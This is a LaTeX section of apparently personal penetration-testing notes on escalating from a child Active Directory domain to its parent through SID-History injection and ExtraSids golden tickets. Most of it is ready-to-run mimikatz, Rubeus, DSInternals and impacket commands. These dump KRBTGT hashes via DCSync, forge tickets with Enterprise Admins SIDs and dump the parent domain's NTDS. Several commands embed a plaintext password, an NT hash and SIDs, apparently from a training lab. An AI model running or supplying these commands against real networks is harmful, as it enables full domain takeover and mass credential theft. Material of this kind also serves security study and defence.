\section{Child - Parent trust Attack}

\subsection{SID-History injection (T1134.005)}
\label{mitre:t1134.005}


modify SID History of an account~\url{https://www.thehacker.recipes/a-d/persistence/sid-history}

\begin{verbatim}
# Install DSInternals on the domain controller
Install-Module -Name DSInternals

# Find the account SID you want to inject
Get-ADUser -Identity $InterestingUser

# Stop the NTDS service
Stop-service NTDS -force

# Inject the SID into the SID History attribute
Add-ADDBSidHistory -samaccountname AttackerUser -sidhistory $SIDOfInterestingUser -DBPath C:\Windows\ntds\ntds.dit

# Start the NTDS service
Start-service NTDS
\end{verbatim}


\subsection{ExtraSids Attack}
\subsubsection{Introduction}

The \href{https://attack.mitre.org/techniques/T1134/005/}{sIDHistory injection} attack consist in injecting harvested or well-known SID values (administrator SID) inside the sIDHistory of a controlled account since the SIDs of the sIDHistory are added to the \emph{acces token}~\ref{win:access-token}

The {\bf SID history} is a property of a {\bf user} or {\bf group object} that allows the object to retain its SID when it is migrated from one domain to another as part of a domain consolidation or restructuring. When an object is migrated to a new domain, it is assigned a new SID in the target domain. The SID history allows the object to retain its original SID, so that access to resources in the source domain is not lost.

If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform \emph{DCSync}~\ref{kerberos:DCSync} and create a \emph{Golden Ticket}~\ref{kerberos:golden-ticker} or a Kerberos ticket-granting ticket (TGT) which will allow for us to authenticate as any account in the domain of our choosing for further persistence.


 If the \emph{sIDHistory} of a controled user in a child domain is set to \emph{Enterprise Admins group} (which only exists in the parent domain), the user is treated as a member of this group, which allows for administrative access to the entire forest. 

 Leverage the \emph{SIDHistory} to grant an account (or  non-existent account) \emph{Enterprise Admin} rights by modifying this attribute to contain the \emph{SID for the Enterprise Admins group}, will give full access to the parent domain without actually being part of the group.

This type of attack will only work when \emph{SID filtering}~\ref{ad:security:sid-filtering} is not set.

The requierements To perform this attack after compromising a child domain,
are:
\begin{itemize}
    \item  The KRBTGT hash for the child domain (using
        mimikatz~\ref{tool:mimikatz:DCSync} on \verb+DOMAIN\krbtgt+)
    \item  The SID for the child domain (\verb+Get-DomainSID+ command)
    \item  The FQDN of the child domain.
    \item  The name of a target user in the child domain (since KB5008380 NEED TO EXIST not need)
    \item  The target user RID
    \item  The SID of the Enterprise Admins group of the root domain (using
            \verb+Get-ADGroup+~\ref{tool:wlol:ad:get-ADGroup} or
            \verb+Get-DomainGroup+~\ref{tool:powerview} on identity
        \verb+"Enterprise Admins"+)
\end{itemize}



\subsubsection{On windows}

dump KRBTGT Account's NT Hash:
\begin{verbatim}
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::dcsync /user:<DOM>\krbtgt"+
\end{verbatim}

Get Domain SID:
\begin{verbatim}
Get-DomainSID
\end{verbatim}

Obtaining Enterprise Admins Group's SID using Get-DomainGroup
\begin{verbatim}
Get-DomainGroup -Domain <parent_fqdn> -Identity "Enterprise Admins" | select distinguishedname,objectsid
\end{verbatim}

Forge ticket (update with user RID
\begin{verbatim}
kerberos::golden /export /user:<user|jubeaz> /id:<user_rid> /group:500,,501,513,512,520,518 /krbtgt:<krbtgt_nthash>  /sid:<child_domain_sid> /domain:<child_domain_FQDN> /sids:<root_domain_sid>-<rid|519> /ptt [/ticket:c:\temp\trust.kirbi]

or

kerberos::golden /export /user:<dc_name>$ /id:<dc_rid> /krbtgt:<krbtgt_nthash>  /groups:516 /sid:<child_domain_sid> /domain:<child_domain_FQDN> /sids:<root_domain_sid>-<rid|516> [/startoffset:-10 /endin:60 /renewmax:10080] /ptt [/ticket:c:\temp\trust.kirbi]
\end{verbatim}

with Rubeus
\begin{verbatim}
.\Rubeus.exe golden /rc4:<nthash> /domain:<child_fqdn> /sid:<child_sid>  
/sids:<parent_sid>-519 /user:<name> /ptt
\end{verbatim}

perform dsync:
\begin{verbatim}
lsadump::dcsync /user:<parent_netbios>\<user>
\end{verbatim}



\verb+mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::lsa /inject /name:krbtgt"+


Using Mimikatz~\ref{tool:mimikatz:sidhistory} or Rubeus~\ref{tool:rubeus:sidhistory}
and the data listed above, it is possible to :
\begin{itemize}
    \item 
        create a Golden Ticket with extra sids to access all resources within the parent domain.
    \item
        or Create inter-realm golden ticket with trust key
\end{itemize}


to check that the ticket works : \verb+ls \\TARGET\c$\SOME\PATH+ or perform a parent domain dcsync

\subsubsection{From Linux}

To get the requiered informations :
\begin{itemize}
    \item the KRBTGT hash for the child domain:
        \verb+secretsdump.py+~\ref{tool:impacket:secretsdump}
    \item the SIDS: \verb+lookupsid.py+~\ref{tool:impacket:lookupsid}
\end{itemize}

\begin{verbatim}
# dump krgtgt hash
secretsdump.py -just-dc -user-status admin.offshore.com/jubeaz:Zaebuj12345+-@<child_dc>
# child SID
lookupsid.py -domain-sids dev.admin.offshore.com/jubeaz:Zaebuj12345+-@<child_dc>
# parent SID
lookupsid.py -domain-sids dev.admin.offshore.com/jubeaz:Zaebuj12345+-@<parent_dc>
\end{verbatim}



{\bf create a golden ticket with extra-sids from parent domain}:

The ticket can be forged with \verb+ticketer.py+~\ref{tool:impacket:tickerter}
and the access validated with \verb+psexec.py+~\ref{tool:impacket:psexec}

\begin{verbatim}
ticketer.py \
    -nthash 9404def404bc198fd9830a3483869e78  \
    -domain-sid S-1-5-21-1416445593-394318334-2645530166 \
    -domain dev.admin.offshore.com \
    -extra-sid S-1-5-21-1216317506-3509444512-4230741538-519 \
    -user-id 11607 \
    jubeaz
\end{verbatim}

then use ticket to dump NTDS
\begin{verbatim}
KRB5CCNAME=/tmp/jubeaz.ccache secretsdump.py \
    -debug -k -no-pass -just-dc-ntlm \
    dev.admin.offshore.com/jubeaz@dc03.admin.offshore.com+
\end{verbatim}

There is also a full automated script \verb+raiseChild.py+~\ref{tool:impacket:raiseChild}


